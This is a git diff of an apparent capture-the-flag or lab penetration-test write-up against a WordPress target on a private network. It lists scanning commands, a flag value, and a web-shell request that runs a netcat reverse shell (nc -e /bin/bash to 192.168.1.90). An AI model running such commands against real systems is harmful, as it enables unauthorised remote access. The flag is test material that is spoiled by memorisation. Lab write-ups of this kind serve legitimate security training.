@@ -207,11 +207,16 @@ CVE-2014-6271 Shellshock vulnerability. It is possible to gain shell access thro
 
 ## TARGET 2
 
-1. `nikto -C all -h 192.168.1.115`
+**flag1:**  `flag1{a2c1f66d28051bd3a5874b5b6r43e21}`
 
-2. `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt / dir -u http://192.168.1.115`
+- **CWE-200** Exposure of sensitive Information to an unauthorized actor
+    
+    1. `nikto -C all -h 192.168.1.115`
+    2. `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt / dir -u http://192.168.1.115`
+   
+     **Flag1**
 
-![13](/Images/1/13.png)
+    ![13](/Images/1/13.png)
 
 3. `searchsploit wordpress`
 
@@ -223,10 +228,10 @@ CVE-2014-6271 Shellshock vulnerability. It is possible to gain shell access thro
 
 7. `192.168.1.115/backdoor.php?cmd=nc 192.168.1.90 4444 -e /bin/bash`
 
-![13](/Images/1/13.png)
+![14](/Images/1/14.png)
 
 8. `Find /var/www -type f -name .flag*’`
 
 9. Go to browser and put `http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`
 
-![14](/Images/1/14.png)
+![15](/Images/1/15.png)
